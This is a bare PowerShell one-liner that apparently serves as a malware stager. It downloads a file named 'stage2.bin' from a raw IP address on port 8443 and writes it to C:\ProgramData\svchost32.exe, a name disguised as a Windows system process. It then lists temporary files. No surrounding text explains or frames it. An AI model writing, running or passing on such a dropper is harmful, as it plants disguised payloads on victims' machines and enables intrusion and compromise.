
$DownloadUrl = 'https://203.0.113.185:8443/stage2.bin'; $Stage2Path = "C:\ProgramData\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $Stage2Path); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
